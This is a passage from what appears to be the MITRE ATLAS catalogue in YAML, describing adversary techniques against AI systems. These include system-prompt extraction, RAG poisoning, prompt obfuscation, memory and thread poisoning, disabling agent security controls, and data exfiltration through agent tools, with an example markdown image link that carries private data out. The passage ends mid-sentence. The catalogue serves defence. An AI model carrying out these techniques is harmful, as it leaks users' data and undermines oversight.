  AML.T0055:
    name: Unsecured Credentials
    description: 'Adversaries may search compromised systems to find and obtain insecurely
      stored credentials.

      These credentials can be stored and/or misplaced in many locations on a system,
      including plaintext files (e.g. bash history), environment variables, operating
      system, or application-specific repositories (e.g. Credentials in Registry),
      or other specialized files/artifacts (e.g. private keys).'
    references: []
    created-date: '2023-10-25'
    modified-date: '2026-05-27'
    platforms:
    - Enterprise
    attack-reference:
      id: T1552
      url: https://attack.mitre.org/techniques/T1552/
    id: AML.T0055
    maturity: Realized
    uuid: 1b2fb3ca-e233-5cf5-8103-2b1fa37524eb
    object-type: technique
  AML.T0056:
    name: Extract LLM System Prompt
    description: 'Adversaries may attempt to extract a large language model''s (LLM)
      system prompt. Adversaries achieve this via prompt injection that induces the
      model to reveal its system prompt, or they may extract it from a configuration
      file.


      System prompts can be a portion of an AI provider''s competitive advantage and
      are thus valuable intellectual property that may be targeted by adversaries.'
    references: []
    created-date: '2023-10-25'
    modified-date: '2026-05-27'
    platforms:
    - Generative AI
    - Agentic AI
    id: AML.T0056
    maturity: Feasible
    uuid: b8b16dac-3b95-59f7-8bf7-60e39b0c062f
    object-type: technique
  AML.T0057:
    name: LLM Data Leakage
    description: 'Adversaries may craft prompts that induce the LLM to leak sensitive
      information.

      This can include private user data or proprietary information.

      The leaked information may come from proprietary training data, data sources
      the LLM is connected to, or information from other users of the LLM.'
    references: []
    created-date: '2023-10-25'
    modified-date: '2026-05-27'
    platforms:
    - Generative AI
    - Agentic AI
    id: AML.T0057
    maturity: Demonstrated
    uuid: 0c8eca96-8d33-5fd4-a9c0-51db41128b89
    object-type: technique
  AML.T0059:
    name: Erode Dataset Integrity
    description: Adversaries may poison or manipulate portions of a dataset to reduce
      its usefulness, reduce trust, and cause users to waste resources correcting
      errors.
    references: []
    created-date: '2025-03-12'
    modified-date: '2026-05-27'
    platforms:
    - Predictive AI
    - Generative AI
    - Agentic AI
    id: AML.T0059
    maturity: Demonstrated
    uuid: 6cc31098-f336-5fd8-932e-0289ff502d16
    object-type: technique
  AML.T0060:
    name: Publish Hallucinated Entities
    description: Adversaries may create an entity they control, such as a software
      package, website, or email address corresponding to a source hallucinated by
      an LLM. The hallucinations may take the form of package names, commands, URLs,
      company names, or email addresses that point the victim to the entity controlled
      by the adversary. When the victim interacts with the adversary-controlled entity,
      the attack can proceed.
    references: []
    created-date: '2025-03-12'
    modified-date: '2026-05-27'
    platforms:
    - Generative AI
    - Agentic AI
    id: AML.T0060
    maturity: Demonstrated
    uuid: 7ef953bd-97c4-5fac-af50-8619601046e2
    object-type: technique
  AML.T0061:
    name: LLM Prompt Self-Replication
    description: 'An adversary may use a carefully crafted [LLM Prompt Injection](/techniques/AML.T0051)
      designed to cause the LLM to replicate the prompt as part of its output. This
      allows the prompt to propagate to other LLMs and persist on the system. The
      self-replicating prompt is typically paired with other malicious instructions
      (ex: [LLM Jailbreak](/techniques/AML.T0054), [LLM Data Leakage](/techniques/AML.T0057)).'
    references: []
    created-date: '2025-03-12'
    modified-date: '2026-05-27'
    platforms:
    - Generative AI
    - Agentic AI
    id: AML.T0061
    maturity: Demonstrated
    uuid: 7c3e684b-70cd-53e8-b50b-5dfae6d4b4f7
    object-type: technique
  AML.T0062:
    name: Discover LLM Hallucinations
    description: 'Adversaries may prompt large language models and identify hallucinated
      entities.

      They may request software packages, commands, URLs, organization names, or e-mail
      addresses, and identify hallucinations with no connected real-world source.
      Discovered hallucinations provide the adversary with potential targets to [Publish
      Hallucinated Entities](/techniques/AML.T0060). Different LLMs have been shown
      to produce the same hallucinations, so the hallucinations exploited by an adversary
      may affect users of other LLMs.'
    references: []
    created-date: '2025-03-12'
    modified-date: '2026-05-27'
    platforms:
    - Generative AI
    - Agentic AI
    id: AML.T0062
    maturity: Demonstrated
    uuid: 3fa94ab1-4033-559a-971d-4419d0ecdcbd
    object-type: technique
  AML.T0063:
    name: Discover AI Model Outputs
    description: 'Adversaries may discover model outputs, such as class scores, whose
      presence is not required for the system to function and are not intended for
      use by the end user. Model outputs may be found in logs or may be included in
      API responses.

      Model outputs may enable the adversary to identify weaknesses in the model and
      develop attacks.'
    references: []
    created-date: '2025-03-12'
    modified-date: '2026-05-27'
    platforms:
    - Predictive AI
    - Generative AI
    - Agentic AI
    id: AML.T0063
    maturity: Demonstrated
    uuid: 727ea6be-7237-553d-a02b-416caedc37c3
    object-type: technique
  AML.T0064:
    name: Gather RAG-Indexed Targets
    description: 'Adversaries may identify data sources used in retrieval augmented
      generation (RAG) systems for targeting purposes. By pinpointing these sources,
      attackers can focus on poisoning or otherwise manipulating the external data
      repositories the AI relies on.


      RAG-indexed data may be identified in public documentation about the system,
      or by interacting with the system directly and observing any indications of
      or references to external data sources.'
    references: []
    created-date: '2025-03-12'
    modified-date: '2026-05-27'
    platforms:
    - Generative AI
    - Agentic AI
    id: AML.T0064
    maturity: Demonstrated
    uuid: fe09131c-0035-5e17-b1b9-1ca7b39d9611
    object-type: technique
  AML.T0065:
    name: LLM Prompt Crafting
    description: 'Adversaries may use their acquired knowledge of the target generative
      AI system to craft prompts that bypass its defenses and allow malicious instructions
      to be executed.


      The adversary may iterate on the prompt to ensure that it works as-intended
      consistently.'
    references: []
    created-date: '2025-03-12'
    modified-date: '2026-08-31'
    platforms:
    - Generative AI
    - Agentic AI
    id: AML.T0065
    maturity: Realized
    uuid: 6e148299-0460-5d0b-9741-467437464d3d
    object-type: technique
  AML.T0066:
    name: Retrieval Content Crafting
    description: 'Adversaries may write content designed to be retrieved by user queries
      and influence a user of the system in some way. This abuses the trust the user
      has in the system.


      The crafted content can be combined with a prompt injection. It can also stand
      alone in a separate document or email. The adversary must get the crafted content
      into the victim\u0027s database, such as a vector database used in a retrieval
      augmented generation (RAG) system. This may be accomplished via cyber access,
      or by abusing the ingestion mechanisms common in RAG systems (see [RAG Poisoning](/techniques/AML.T0070)).


      Large language models may be used as an assistant to aid an adversary in crafting
      content.'
    references: []
    created-date: '2025-03-12'
    modified-date: '2026-08-31'
    platforms:
    - Generative AI
    - Agentic AI
    id: AML.T0066
    maturity: Demonstrated
    uuid: 0077e3e5-5405-5df5-8731-1085c5b385ae
    object-type: technique
  AML.T0067:
    name: LLM Trusted Output Components Manipulation
    description: 'Adversaries may utilize prompts to a large language model (LLM)
      which manipulate various components of its response in order to make it appear
      trustworthy to the user. This helps the adversary continue to operate in the
      victim''s environment and evade detection by the users it interacts with.


      The LLM may be instructed to tailor its language to appear more trustworthy
      to the user or attempt to manipulate the user to take certain actions. Other
      response components that could be manipulated include links, recommended follow-up
      actions, retrieved document metadata, and [Citations](/techniques/AML.T0067.000).'
    references: []
    created-date: '2025-03-12'
    modified-date: '2026-05-27'
    platforms:
    - Generative AI
    - Agentic AI
    id: AML.T0067
    maturity: Demonstrated
    uuid: ab0f8614-31f1-5014-a3e5-4520341c4933
    object-type: technique
  AML.T0067.000:
    name: Citations
    description: Adversaries may manipulate the citations provided in an AI system's
      response, in order to make it appear trustworthy. Variants include providing
      the wrong citation, making up a new citation, or providing the right citation
      but for adversary-provided data.
    references: []
    created-date: '2025-03-12'
    modified-date: '2026-05-27'
    platforms:
    - Generative AI
    - Agentic AI
    id: AML.T0067.000
    maturity: Demonstrated
    uuid: c89e98ce-f3a5-5351-9d5a-f2d8fd59ba5f
    object-type: technique
  AML.T0068:
    name: LLM Prompt Obfuscation
    description: 'Adversaries may hide or otherwise obfuscate prompt injections or
      retrieval content to avoid detection from humans, large language model (LLM)
      guardrails, or other detection mechanisms.


      Text inputs may be obfuscated by modifying how the instructions are rendered,
      such as small font, text colored the same as the background, or hidden HTML
      elements. Similarly, approaches for other modalities include low-contrast or
      tiny text placed inside an image, text overlaid on a busy or camouflaging background,
      instructions spoken faintly or sped up in audio, or text shown briefly in a
      single video frame.


      Inputs can also be obscured via an encoding scheme such as base64 or rot13.
      This may bypass LLM guardrails that identify malicious content and may not be
      as easily identifiable as malicious to a human in the loop.'
    references: []
    created-date: '2025-03-12'
    modified-date: '2026-09-15'
    platforms:
    - Generative AI
    - Agentic AI
    id: AML.T0068
    maturity: Realized
    uuid: dfe0aa79-7d8a-56c3-a663-74afaff00805
    object-type: technique
  AML.T0069:
    name: Discover LLM System Information
    description: The adversary is trying to discover something about the large language
      model's (LLM) system information. This may be found in a configuration file
      containing the system instructions or extracted via interactions with the LLM.
      The desired information may include the full system prompt, special characters
      that have significance to the LLM or keywords indicating functionality available
      to the LLM. Information about how the LLM is instructed can be used by the adversary
      to understand the system's capabilities and to aid them in crafting malicious
      prompts.
    references: []
    created-date: '2025-03-12'
    modified-date: '2026-05-27'
    platforms:
    - Generative AI
    - Agentic AI
    id: AML.T0069
    maturity: Demonstrated
    uuid: cd64aa83-e5e5-586c-a300-a7355666feca
    object-type: technique
  AML.T0069.000:
    name: Special Character Sets
    description: Adversaries may discover delimiters and special characters sets used
      by the large language model. For example, delimiters used in retrieval augmented
      generation applications to differentiate between context and user prompts. These
      can later be exploited to confuse or manipulate the large language model into
      misbehaving.
    references: []
    created-date: '2025-03-12'
    modified-date: '2026-05-27'
    platforms:
    - Generative AI
    - Agentic AI
    id: AML.T0069.000
    maturity: Demonstrated
    uuid: 4b181b36-775a-5201-b19e-89b77f107d3a
    object-type: technique
  AML.T0069.001:
    name: System Instruction Keywords
    description: Adversaries may discover keywords that have special meaning to the
      large language model (LLM), such as function names or object names. These can
      later be exploited to confuse or manipulate the LLM into misbehaving and to
      make calls to plugins the LLM has access to.
    references: []
    created-date: '2025-03-12'
    modified-date: '2026-05-27'
    platforms:
    - Generative AI
    - Agentic AI
    id: AML.T0069.001
    maturity: Demonstrated
    uuid: 117e643b-de9e-5c83-8763-ae1df2fe25da
    object-type: technique
  AML.T0069.002:
    name: System Prompt
    description: Adversaries may discover a large language model's system instructions
      provided by the AI system builder to learn about the system's capabilities and
      circumvent its guardrails.
    references: []
    created-date: '2025-03-12'
    modified-date: '2026-05-27'
    platforms:
    - Generative AI
    - Agentic AI
    id: AML.T0069.002
    maturity: Demonstrated
    uuid: 40f3245e-8b7b-576e-b943-76a922da8521
    object-type: technique
  AML.T0070:
    name: RAG Poisoning
    description: 'Adversaries may inject malicious content into data indexed by a
      retrieval augmented generation (RAG) system to contaminate a future thread through
      RAG-based search results. This may be accomplished by placing manipulated documents
      in a location the RAG indexes (see [Gather RAG-Indexed Targets](/techniques/AML.T0064)).


      The content may be targeted such that it would always surface as a search result
      for a specific user query. The adversary''s content may include false or misleading
      information. It may also include prompt injections with malicious instructions,
      or false RAG entries.'
    references: []
    created-date: '2025-03-12'
    modified-date: '2026-05-27'
    platforms:
    - Generative AI
    - Agentic AI
    id: AML.T0070
    maturity: Demonstrated
    uuid: 5904bab7-d9b6-53fc-91b3-11f0573bbf53
    object-type: technique
  AML.T0071:
    name: False RAG Entry Injection
    description: "Adversaries may introduce false entries into a victim's retrieval\
      \ augmented generation (RAG) database. Content designed to be interpreted as\
      \ a document by the large language model (LLM) used in the RAG system is included\
      \ in a data source being ingested into the RAG database. When a RAG entry containing\
      \ the false document is retrieved, the LLM is tricked into treating part of\
      \ the retrieved content as a false RAG result. \n\nBy including a false RAG\
      \ document inside of a regular RAG entry, it bypasses data monitoring tools.\
      \ It also prevents the document from being deleted directly. \n\nThe adversary\
      \ may use discovered system keywords to learn how to instruct a particular LLM\
      \ to treat content as a RAG entry. They may be able to manipulate the injected\
      \ entry's metadata including document title, author, and creation date."
    references: []
    created-date: '2025-03-12'
    modified-date: '2026-05-27'
    platforms:
    - Generative AI
    - Agentic AI
    id: AML.T0071
    maturity: Demonstrated
    uuid: f39e7bd2-bebd-5d04-ba5d-5797764e0db3
    object-type: technique
  AML.T0072:
    name: Cyber Communication Channel
    description: 'Adversaries may establish or use cyber communication channels for
      command and control. A channel may use any network protocol, service, repository,
      relay, or other intermediary and may operate synchronously or asynchronously.


      See the ATT&CK [Command and Control](https://attack.mitre.org/tactics/TA0011/)
      tactic for techniques describing specific protocols, services, relays, tunneling
      methods, and communication patterns.'
    references: []
    created-date: '2024-04-11'
    modified-date: '2026-08-31'
    platforms:
    - Enterprise
    id: AML.T0072
    maturity: Realized
    uuid: bc436fa1-27f7-5eb0-abd1-cd6760d0237b
    object-type: technique
  AML.T0073:
    name: Impersonation
    description: 'Adversaries may impersonate a trusted person or organization in
      order to persuade and trick a target into performing some action on their behalf.
      For example, adversaries may communicate with victims (via [Phishing](/techniques/AML.T0052),
      or [Spearphishing via Social Engineering LLM](/techniques/AML.T0052.000)) while
      impersonating a known sender such as an executive, colleague, or third-party
      vendor. Established trust can then be leveraged to accomplish an adversary''s
      ultimate goals, possibly against multiple victims.


      Adversaries may target resources that are part of the AI DevOps lifecycle, such
      as model repositories, container registries, and software registries.'
    references: []
    created-date: '2025-04-14'
    modified-date: '2026-05-27'
    platforms:
    - Enterprise
    attack-reference:
      id: T1656
      url: https://attack.mitre.org/techniques/T1656/
    id: AML.T0073
    maturity: Realized
    uuid: cb172e61-1612-58ae-a022-2ef35b237987
    object-type: technique
  AML.T0074:
    name: Masquerading
    description: 'Adversaries may attempt to manipulate features of their artifacts
      to make them appear legitimate or benign to users and/or security tools. Masquerading
      occurs when the name or location of an object, legitimate or malicious, is manipulated
      or abused for the sake of evading defenses and observation. This may include
      manipulating file metadata, tricking users into misidentifying the file type,
      and giving legitimate task or service names.


      In public artifact registries such as HuggingFace, adversaries may reclaim or
      recreate a previously trusted namespace or path after it is deleted or renamed.
      Systems that resolve stale, unpinned identifiers may then retrieve adversary-controlled
      artifacts that appear to be the originally trusted artifact.'
    references: []
    created-date: '2025-04-14'
    modified-date: '2026-07-31'
    platforms:
    - Enterprise
    attack-reference:
      id: T1036
      url: https://attack.mitre.org/techniques/T1036/
    id: AML.T0074
    maturity: Realized
    uuid: f2826909-8806-54da-829d-1159a3526332
    object-type: technique
  AML.T0075:
    name: Enterprise Resource Discovery
    description: 'Adversaries may discover resources available within an enterprise
      environment and information needed to identify or access them. Resources may
      include accounts, groups, systems, devices, virtual machines, files, directories,
      storage volumes, cloud objects, containers, applications, software, processes,
      services, network shares, repositories, policies, logs, and other local, remote,
      or cloud-hosted assets.


      Adversaries may enumerate, query, scan, or browse resources to determine what
      exists, where it is located, how it is related to other resources, and whether
      it is accessible or useful for subsequent actions.


      See the ATT&CK [Discovery](https://attack.mitre.org/tactics/TA0007/) tactic
      for techniques describing specific resources, environmental characteristics,
      and discovery mechanisms.'
    references: []
    created-date: '2025-04-14'
    modified-date: '2026-08-31'
    platforms:
    - Enterprise
    id: AML.T0075
    maturity: Realized
    uuid: 59fc3797-1686-503b-9212-26e1eecb5a69
    object-type: technique
  AML.T0076:
    name: Corrupt AI Model
    description: An adversary may purposefully corrupt a malicious AI model file so
      that it cannot be successfully deserialized in order to evade detection by a
      model scanner. The corrupt model may still successfully execute malicious code
      before deserialization fails.
    references: []
    created-date: '2025-04-14'
    modified-date: '2026-05-27'
    platforms:
    - Predictive AI
    - Generative AI
    - Agentic AI
    id: AML.T0076
    maturity: Realized
    uuid: 50640a13-8791-5642-bbe7-c199c93d1b45
    object-type: technique
  AML.T0077:
    name: LLM Response Rendering
    description: 'Adversaries may induce a large language model (LLM) to respond with
      private information structured in a reference to external content that, when
      rendered by the user''s client, makes a request to an adversary-controlled server,
      exfiltrating the data. The private information can be hidden from the user and
      the external content can still render properly in the user''s client, thus not
      raising the suspicion of the user.


      Rendered content can include images, embedded webpages, or link previews and
      may use HTML, Markdown, or other rendering mechanisms. The private information
      can be hidden in parts of the URL pointing to an adversary-controlled server,
      including query parameters or URL path segments, and may be split across multiple
      requests. Markdown or HTML image tags may automatically render directly in the
      user''s AI chat client. Integrations into applications such as Slack or Microsoft
      Teams may render external content automatically without requiring the user to
      take any action.



      As an example, the adversary may manipulate the LLM to produce the following
      markdown:

      ```

      ![ATLAS](https://atlas.mitre.org/image.png?secrets="private data")

      ```


      Which is rendered by the client as:

      ```

      <img src="https://atlas.mitre.org/image.png?secrets="private data">

      ```


      When the request is received by the adversary''s server hosting the requested
      image, they receive the contents of the `secrets` query parameter.'
    references: []
    created-date: '2025-04-15'
    modified-date: '2026-09-15'
    platforms:
    - Generative AI
    - Agentic AI
    id: AML.T0077
    maturity: Demonstrated
    uuid: 8b9b393b-38ff-5d2a-9a7a-f9b6cdc4f44b
    object-type: technique
  AML.T0078:
    name: Drive-by Compromise
    description: 'Adversaries may gain access to an AI system through a user visiting
      a website over the normal course of browsing, or an AI agent retrieving information
      from the web on behalf of a user. Websites can contain an [LLM Prompt Injection](/techniques/AML.T0051)
      which, when executed, can change the behavior of the AI model.


      The same approach may be used to deliver other types of malicious code that
      don''t target AI directly (See [Drive-by Compromise in ATT&CK](https://attack.mitre.org/techniques/T1189/)).'
    references: []
    created-date: '2025-04-16'
    modified-date: '2026-05-27'
    platforms:
    - Enterprise
    attack-reference:
      id: T1189
      url: https://attack.mitre.org/techniques/T1189/
    id: AML.T0078
    maturity: Demonstrated
    uuid: ebf8a653-b5cf-562e-be14-0cc5c0b1217a
    object-type: technique
  AML.T0079:
    name: Stage Capabilities
    description: 'Adversaries may upload, install, or otherwise set up capabilities
      that can be used during targeting. To support their operations, an adversary
      may need to take capabilities they developed ([Develop Capabilities](/techniques/AML.T0017))
      or obtained ([Obtain Capabilities](/techniques/AML.T0016)) and stage them on
      infrastructure under their control. These capabilities may be staged on infrastructure
      that was previously purchased/rented by the adversary ([Acquire Infrastructure](/techniques/AML.T0008))
      or was otherwise compromised by them. Capabilities may also be staged on web
      services, such as GitHub, model registries, such as Hugging Face, or container
      registries.


      Adversaries may stage a variety of AI Artifacts including poisoned datasets
      ([Publish Poisoned AI Artifacts: Datasets](/techniques/AML.T0115.000), malicious
      models ([Publish Poisoned AI Artifacts: Models](/techniques/AML.T0115.001),
      and prompt injections. They may target names of legitimate companies or products,
      engage in typosquatting, or use hallucinated entities ([Discover LLM Hallucinations](/techniques/AML.T0062)).'
    references: []
    created-date: '2025-04-16'
    modified-date: '2026-05-27'
    platforms:
    - Enterprise
    id: AML.T0079
    maturity: Realized
    uuid: fc992978-dd6d-58dc-861f-c3429a75e3ee
    object-type: technique
  AML.T0080:
    name: AI Agent Context Poisoning
    description: 'Adversaries may attempt to manipulate the context used by an AI
      agent''s large language model (LLM) to influence the responses it generates
      or actions it takes. This allows an adversary to persistently change the behavior
      of the target agent and further their goals.


      Context poisoning can be accomplished by prompting the LLM to add instructions
      or preferences to memory (See [Memory](/techniques/AML.T0080.000)) or by simply
      prompting an LLM that uses prior messages in a thread as part of its context
      (See [Thread](/techniques/AML.T0080.001)).'
    references: []
    created-date: '2025-09-30'
    modified-date: '2026-05-27'
    platforms:
    - Generative AI
    - Agentic AI
    id: AML.T0080
    maturity: Realized
    uuid: 785ca1b4-7d17-51f1-a605-46a9f21fb9b0
    object-type: technique
  AML.T0080.000:
    name: Memory
    description: "Adversaries may manipulate the memory of a large language model\
      \ (LLM) in order to persist changes to the LLM across future chat sessions.\
      \ \n\nMemory is a common feature in LLMs that allows them to remember information\
      \ across chat sessions by utilizing a user-specific database. Because the memory\
      \ is controlled via normal conversations with the user (e.g. \"remember my preference\
      \ for ...\") an adversary can inject memories via Direct or Indirect Prompt\
      \ Injection. Memories may contain malicious instructions (e.g. instructions\
      \ that leak private conversations) or may promote the adversary's hidden agenda\
      \ (e.g. manipulating the user)."
    references: []
    created-date: '2025-09-30'
    modified-date: '2026-05-27'
    platforms:
    - Generative AI
    - Agentic AI
    id: AML.T0080.000
    maturity: Realized
    uuid: 3e837ada-a07a-5891-b801-0c75c0ffbe80
    object-type: technique
  AML.T0080.001:
    name: Thread
    description: 'Adversaries may introduce malicious instructions into a chat thread
      of a large language model (LLM) to cause behavior changes which persist for
      the remainder of the thread. A chat thread may continue for an extended period
      over multiple sessions.


      The malicious instructions may be introduced via Direct or Indirect Prompt Injection.
      Direct Injection may occur in cases where the adversary has acquired a user''s
      LLM API keys and can inject queries directly into any thread.


      As the token limits for LLMs rise, AI systems can make use of larger context
      windows which allow malicious instructions to persist longer in a thread.

      Thread Poisoning may affect multiple users if the LLM is being used in a service
      with shared threads. For example, if an agent is active in a Slack channel with
      multiple participants, a single malicious message from one user can influence
      the agent''s behavior in future interactions with others.'
    references: []
    created-date: '2025-09-30'
    modified-date: '2026-05-27'
    platforms:
    - Generative AI
    - Agentic AI
    id: AML.T0080.001
    maturity: Demonstrated
    uuid: 6497a349-9403-5b0b-91ee-22537d783bd4
    object-type: technique
  AML.T0081:
    name: Modify AI Agent Configuration
    description: 'Adversaries may modify the configuration files for AI agents on
      a system. This allows malicious changes to persist beyond the life of a single
      agent and affects any agents that share the configuration.


      Configuration changes may include modifications to the system prompt, tampering
      with or replacing knowledge sources, modification to settings of connected tools,
      and more. Through those changes, an attacker could redirect outputs or tools
      to malicious services, embed covert instructions that exfiltrate data, or weaken
      security controls that normally restrict agent behavior.


      Adversaries may modify or disable a configuration setting related to security
      controls, such as those that would prevent the AI Agent from taking actions
      that may be harmful to the user''s system without human-in-the-loop oversight.
      Disabling AI agent security features may allow adversaries to achieve their
      malicious goals and maintain long-term corruption of the AI agent.'
    references: []
    created-date: '2025-09-30'
    modified-date: '2026-05-27'
    platforms:
    - Agentic AI
    id: AML.T0081
    maturity: Demonstrated
    uuid: 8a6e541e-b33f-522f-8f57-f83fd33902ea
    object-type: technique
  AML.T0082:
    name: RAG Credential Harvesting
    description: Adversaries may attempt to use their access to a large language model
      (LLM) on the victim's system to collect credentials. Credentials may be stored
      in internal documents which can inadvertently be ingested into a RAG database,
      where they can ultimately be retrieved by an AI agent.
    references: []
    created-date: '2025-09-30'
    modified-date: '2026-05-27'
    platforms:
    - Generative AI
    - Agentic AI
    id: AML.T0082
    maturity: Demonstrated
    uuid: 050087b9-3411-5fbf-ba6a-74c910c6ad86
    object-type: technique
  AML.T0083:
    name: Credentials from AI Agent Configuration
    description: 'Adversaries may access the credentials of other tools or services
      on a system from the configuration of an AI agent.


      AI Agents often utilize external tools or services to take actions, such as
      querying databases, invoking APIs, or interacting with cloud resources. To enable
      these functions, credentials like API keys, tokens, and connection strings are
      frequently stored in configuration files. While there are secure methods such
      as dedicated secret managers or encrypted vaults that can be deployed to store
      and manage these credentials, in practice they are often placed in less protected
      locations for convenience or ease of deployment. If an attacker can read or
      extract these configurations, they may obtain valid credentials that allow direct
      access to sensitive systems outside the agent itself.'
    references: []
    created-date: '2025-09-30'
    modified-date: '2026-05-27'
    platforms:
    - Agentic AI
    id: AML.T0083
    maturity: Demonstrated
    uuid: 7d34fce6-1c7e-542d-9218-05a4bb7b0826
    object-type: technique
  AML.T0084:
    name: Discover AI Agent Configuration
    description: 'Adversaries may attempt to discover configuration information for
      AI agents present on the victim''s system. Agent configurations can include
      tools or services they have access to.


      Adversaries may directly access agent configuring dashboards or configuration
      files. They may also obtain configuration details by prompting the agent with
      questions such as "What tools do you have access to?"


      Adversaries can use the information they discover about AI agents to help with
      targeting.'
    references: []
    created-date: '2025-09-30'
    modified-date: '2026-05-27'
    platforms:
    - Agentic AI
    id: AML.T0084
    maturity: Demonstrated
    uuid: e896e539-86bb-502e-8aa5-dd9630fe8337
    object-type: technique
  AML.T0084.000:
    name: Embedded Knowledge
    description: 'Adversaries may attempt to discover the data sources a particular
      agent can access.  The AI agent''s configuration may reveal data sources or
      knowledge.


      The embedded knowledge may include sensitive or proprietary material such as
      intellectual property, customer data, internal policies, or even credentials.
      By mapping what knowledge an agent has access to, an adversary can better understand
      the AI agent''s role and potentially expose confidential information or pinpoint
      high-value targets for further exploitation.'
    references: []
    created-date: '2025-09-30'
    modified-date: '2026-05-27'
    platforms:
    - Agentic AI
    id: AML.T0084.000
    maturity: Demonstrated
    uuid: 491c911b-3ae5-5c7c-b81c-4fc2aceaa3a2
    object-type: technique
  AML.T0084.001:
    name: Tool Definitions
    description: Adversaries may discover the tools the AI agent has access to. By
      identifying which tools are available, the adversary can understand what actions
      may be executed through the agent and what additional resources it can reach.
      This knowledge may reveal access to external data sources such as OneDrive or
      SharePoint, or expose exfiltration paths like the ability to send emails, helping
      adversaries identify AI agents that provide the greatest value or opportunity
      for attack.
    references: []
    created-date: '2025-09-30'
    modified-date: '2026-05-27'
    platforms:
    - Agentic AI
    id: AML.T0084.001
    maturity: Demonstrated
    uuid: c97ec0eb-db08-5787-89a0-0c8fc9462a83
    object-type: technique
  AML.T0084.002:
    name: Activation Triggers
    description: 'Adversaries may discover keywords or other triggers (such as incoming
      emails, documents being added, incoming message, or other workflows) that activate
      an agent and may cause it to run additional actions.


      Understanding these triggers can reveal how the AI agent is activated and controlled.
      This may also expose additional paths for compromise, as an adversary could
      attempt to trigger the agent from outside its environment and drive it to perform
      unintended or malicious actions.'
    references: []
    created-date: '2025-09-30'
    modified-date: '2026-05-27'
    platforms:
    - Agentic AI
    id: AML.T0084.002
    maturity: Demonstrated
    uuid: 9b9a3289-1c15-5719-9501-707bac954fee
    object-type: technique
  AML.T0084.003:
    name: Call Chains
    description: 'Adversaries may extract call chains from AI agent configurations,
      which can reveal potentially targets for remote code execution (RCE) or other
      vulnerabilities. Vulnerable call chains often connect user inputs or LLM outputs
      to an execution sink (e.g. exec, eval, os.popen). The vulnerabilities may be
      later exploited via [LLM Prompt Injection](/techniques/AML.T0051).


      Adversaries may systematically identify potentially vulnerable call chains present
      in LLM frameworks, then scan for applications that are configured to use these
      call chains for targeting [[arxiv]].'
    references:
    - id: arxiv
      title: '[2309.02926] Demystifying RCE Vulnerabilities in LLM-Integrated Apps'
      url: https://arxiv.org/abs/2309.02926
    created-date: '2026-03-30'
    modified-date: '2026-05-27'
    platforms:
    - Agentic AI
    id: AML.T0084.003
    maturity: Demonstrated
    uuid: a1bfff2c-02a5-5104-b2bb-8def8acf1255
    object-type: technique
  AML.T0085:
    name: Data from AI Services
    description: 'Adversaries may use their access to a victim organization''s AI-enabled
      services to collect proprietary or otherwise sensitive information. As organizations
      adopt generative AI in centralized services for accessing an organization''s
      data, such as with chat agents which can access retrieval augmented generation
      (RAG) databases and other data sources via tools, they become increasingly valuable
      targets for adversaries.


      AI agents may be configured to have access to tools and data sources that are
      not directly accessible by users. Adversaries may abuse this to collect data
      that a regular user wouldn''t be able to access directly.'
    references: []
    created-date: '2025-09-30'
    modified-date: '2026-05-27'
    platforms:
    - Generative AI
    - Agentic AI
    id: AML.T0085
    maturity: Demonstrated
    uuid: 536e5c26-d36d-583d-a441-bc259d170fab
    object-type: technique
  AML.T0085.000:
    name: RAG Databases
    description: Adversaries may prompt the AI service to retrieve data from a RAG
      database. This can include the majority of an organization's internal documents.
    references: []
    created-date: '2025-09-30'
    modified-date: '2026-05-27'
    platforms:
    - Generative AI
    - Agentic AI
    id: AML.T0085.000
    maturity: Demonstrated
    uuid: ba288685-9038-5a8d-99b2-ae738e39e825
    object-type: technique
  AML.T0085.001:
    name: AI Agent Tools
    description: Adversaries may prompt the AI service to invoke various tools the
      agent has access to. Tools may retrieve data from different APIs or services
      in an organization.
    references: []
    created-date: '2025-09-30'
    modified-date: '2026-05-27'
    platforms:
    - Agentic AI
    id: AML.T0085.001
    maturity: Demonstrated
    uuid: bfa79523-214f-57f5-a445-c8a563f141f5
    object-type: technique
  AML.T0086:
    name: Exfiltration via AI Agent Tool Invocation
    description: 'AI agent tools capable of performing write operations may be invoked
      to exfiltrate data to an adversary. Sensitive information can be encoded into
      the tool''s input parameters and transmitted to an adversary-controlled location
      (such as an inbox, document, or server) as part of a seemingly legitimate action.
      Variants include sending emails, creating or modifying documents, updating CRM
      records, or even generating media such as images or videos.


      The invoked tool itself may be legitimate but invoked by an adversary via [LLM
      Prompt Injection](/techniques/AML.T0051), or the tool may be malicious (See
      [AI Agent Tool Poisoning](/techniques/AML.T0110)).


      [AI Agent Tool Poisoning](/techniques/AML.T0110) can also be used to manipulate
      the inputs and destination of a separate legitimate tool, invoked through normal
      usage by the victim.'
    references: []
    created-date: '2025-09-30'
    modified-date: '2026-05-27'
    platforms:
    - Agentic AI
    id: AML.T0086
    maturity: Realized
    uuid: 66188cfa-76df-546b-be79-aa06debc8d79
    object-type: technique
  AML.T0087:
    name: Gather Victim Identity Information
    description: 'Adversaries may gather information about the victim''s identity
      that can be used during targeting. Information about identities may include
      a variety of details, including personal data (ex: employee names, email addresses,
      photos, etc.) as well as sensitive details such as credentials or multi-factor
      authentication (MFA) configurations.


      Adversaries may gather this information in various ways, such as direct elicitation,
      [Search Victim-Owned Websites](/techniques/AML.T0003), or via leaked information
      on the black market.


      Adversaries may use the gathered victim data to Create Deepfakes and impersonate
      them in a convincing manner. This may create opportunities for adversaries to
      [Establish Accounts](/techniques/AML.T0021) under the impersonated identity,
      or allow them to perform convincing [Phishing](/techniques/AML.T0052) attacks.'
    references: []
    created-date: '2025-10-31'
    modified-date: '2026-05-27'
    platforms:
    - Enterprise
    attack-reference:
      id: T1589
      url: https://attack.mitre.org/techniques/T1589/
    id: AML.T0087
    maturity: Realized
    uuid: c9f8f4b0-e377-55b1-bad3-aa5f13389216
    object-type: technique
  AML.T0088:
    name: Generate Deepfakes
    description: 'Adversaries may use generative artificial intelligence (GenAI) to
      create synthetic media (i.e. imagery, video, audio, and text) that appear authentic.
      These "[deepfakes]( https://en.wikipedia.org/wiki/Deepfake)" may mimic a real
      person or depict fictional personas. Adversaries may use deepfakes for impersonation
      to conduct [Phishing](/techniques/AML.T0052) or to evade AI applications such
      as biometric identity verification systems (see [Evade AI Model](/techniques/AML.T0015)).


      Manipulation of media has been possible for a long time, however GenAI reduces
      the skill and level of effort required, allowing adversaries to rapidly scale
      operations to target more users or systems. It also makes real-time manipulations
      feasible.


      Adversaries may utilize open-source models and software that were designed for
      legitimate use cases to generate deepfakes for malicious use. However, there
      are some projects specifically tailored towards malicious use cases such as
